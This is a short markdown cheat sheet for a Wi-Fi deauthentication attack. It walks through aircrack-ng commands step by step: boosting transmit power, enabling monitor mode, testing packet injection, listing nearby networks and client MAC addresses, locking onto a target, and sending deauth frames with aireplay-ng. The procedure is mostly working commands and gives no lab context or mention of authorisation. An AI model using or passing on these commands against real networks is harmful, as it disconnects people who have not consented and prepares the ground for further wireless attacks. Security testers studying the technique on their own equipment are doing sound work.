# Deauthentication Attack
### Set router to max power
```
sudo iwconfig wlan1mon txpower 30
```
### Check / kill:
If things are weird
```
sudo airmon-ng check kill
```
### wlan1 Monitor mode:
```
sudo airmon-ng start wlan1
```
Interface now is appended `mon` e.g `wlan1mon`
### Test for packet injection
Once it's in monitor mode, run a test:
```
sudo aireplay-ng --test wlan1mon
```
Should see `Injection is working!`
### Gather MAC addresses
Use this command to see live network traffic, enabling you to see all the devices on the network and their MAC addresses. if you run this live you'll inevitably see the clients disconnect and reconnect when you deauth. Remember to add `--band a` for 5GHz: 
```
sudo airodump-ng wlan1mon --band abg -w dump
```
The top half are going to be the available WIFI networks / Access Points (APs). You have to output to file because the terminal is too small to display all of them. The bottom half are going to be clients/`STATIONS` and the `Probes` should tell you what they're connected to.

Once you've found your target, listen to it live with:
```
sudo airodump-ng wlan1mon --bssid XX:XX:XX:XX:XX:XX --band abg
```
OR (try both - router likely broadcasts multiple BSSIDs, once for each GHz or if it multiplate bands(?))
```
sudo airodump-ng wlan1mon --essid "NetworkName" --band abg
```
The actual deauth: where `5` is the number of deauths, `0` would be to send them continously.
```
sudo aireplay-ng -0 5 -a ACCESSPOINT-BSSID -c CLIENT-BSSID wlan1mon
```

## NOTE
You have to be on the same channel as the AP you're deauthing, change it with:
```
sudo iwconfig wlan1mon channel 149
```

---
### For list of attacks:
We want `0` here
```
aireplay-ng
```
